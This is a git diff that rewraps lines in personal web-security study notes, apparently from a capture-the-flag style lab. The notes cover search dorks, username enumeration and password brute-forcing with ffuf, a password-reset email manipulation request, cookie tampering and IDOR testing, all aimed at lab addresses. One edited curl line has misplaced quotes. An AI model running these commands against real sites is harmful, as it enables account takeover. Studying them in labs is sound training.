@@ -16,7 +16,8 @@ filetype  |  filetype:pdf            |    returns results which are a particular
 intitle   |  intitle:admin           |    returns results that contain the specified word in the title
 }
 
--Wappalyzer (https://www.wappalyzer.com/) is an online tool and browser extension that helps identify what technologies a website uses, such as frameworks, Content Management Systems (CMS), payment processors and much more, and it can even find version numbers as well.
+-Wappalyzer (https://www.wappalyzer.com/) is an online tool and browser extension that helps identify what technologies a website uses, such as frameworks, 
+Content Management Systems (CMS), payment processors and much more, and it can even find version numbers as well.
 
 -The Wayback Machine (https://archive.org/web/)
 
@@ -38,15 +39,18 @@ intitle   |  intitle:admin           |    returns results that contain the speci
 
 3. Authentication Bypass:
 
--USERNAME ENUMERATION _ (ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u <address> -mr "username already exists")
+-USERNAME ENUMERATION _ (ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" 
+                         -H "Content-Type: application/x-www-form-urlencoded" -u <address> -mr "username already exists")
 
 
--Bruteforcing with ffuf - (ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.219.162/customers/login -fc 200)
+-Bruteforcing with ffuf - (ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 
+                          -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.219.162/customers/login -fc 200)
 
 
--Curl Reques - (curl 'http://10.10.171.140/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm')
+-Curl Reques - (curl 'http://10.10.171.140/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' 
+                -d 'username=robert&email={username}@customer.acmeitsupport.thm')
 
--Cookie Tampering - Plain Text - (curl -H "Cookie: logged_in=true; admin=true"                                  http://10.10.171.140/cookie-test)
+-Cookie Tampering - Plain Text - (curl -H "Cookie: logged_in=true; admin=true "http://10.10.171.140/cookie-test")
 
 
 
@@ -54,7 +58,9 @@ intitle   |  intitle:admin           |    returns results that contain the speci
 -Common encoding for websites - base64
 -Common hashing algorithm - md5
 
--If the Id cannot be detected using the above methods, an excellent method of IDOR detection is to create two accounts and swap the Id numbers between them. If you can view the other users' content using their Id number while still being logged in with a different account (or not logged in at all), you've found a valid IDOR vulnerability.
+-If the Id cannot be detected using the above methods, an excellent method of IDOR detection is to create two accounts and swap the 
+Id numbers between them. If you can view the other users' content using their Id number while still being logged in with a different account (or not logged in at all), 
+you've found a valid IDOR vulnerability.
 
 
 
